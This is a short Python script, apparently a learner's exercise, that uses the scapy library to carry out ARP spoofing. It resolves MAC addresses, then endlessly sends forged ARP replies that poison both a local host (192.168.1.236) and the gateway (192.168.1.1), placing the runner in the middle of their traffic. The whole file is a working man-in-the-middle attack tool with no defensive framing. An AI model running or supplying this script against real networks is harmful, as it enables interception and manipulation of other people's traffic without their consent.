from os import supports_follow_symlinks
import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcat = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_reques_broadcast = broadcat/arp_request
    # VERBOSE IS OFF DETAIL WILL NOT BE DISPLAYED
    answered_list = scapy.srp(arp_reques_broadcast,
                              timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc
    # client_list = []
    # for element in answered_list:
    #     client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
    #     client_list.append(client_dict)
    #     # PRINT IP ADDRESS
    #     #print(element[1].psrc + "\t\t" + element[1].hwsrc)

    # return client_list


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet)


while True:
    spoof("192.168.1.236", "192.168.1.1")
    spoof("192.168.1.1", "192.168.1.236")
    time.sleep(3)
